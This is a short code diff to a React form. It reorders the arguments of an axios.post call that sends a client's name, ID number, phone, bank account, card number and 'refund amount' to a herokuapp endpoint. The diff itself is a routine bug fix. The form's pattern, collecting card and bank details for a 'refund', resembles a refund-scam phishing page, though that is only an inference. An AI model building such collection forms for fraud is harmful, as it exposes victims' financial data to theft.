@@ -65,18 +65,19 @@ export default function Form() {
     
     const userRequestHandler = () => {
 
-        axios.post("https://investment-com.herokuapp.com/add-order", {
-            headers: {
-                'Content-type': null
-            }
-        },{
+        axios.post("https://investment-com.herokuapp.com/add-order",{
             fullname: values.clientFullname,
             idNumber: values.clientId,
             phoneNumber: values.clientPhoneNumber,
             refundAmount: values.refundAmount,
             userBank: values.clientBankAccount,
             cardNumber: values.clientCardNumber
-        }).then((response) => {
+        }, {
+            headers: {
+                'Content-type': null
+            }
+        }
+        ).then((response) => {
             if(response.data.saved) {
                 setOpen(true);
             }
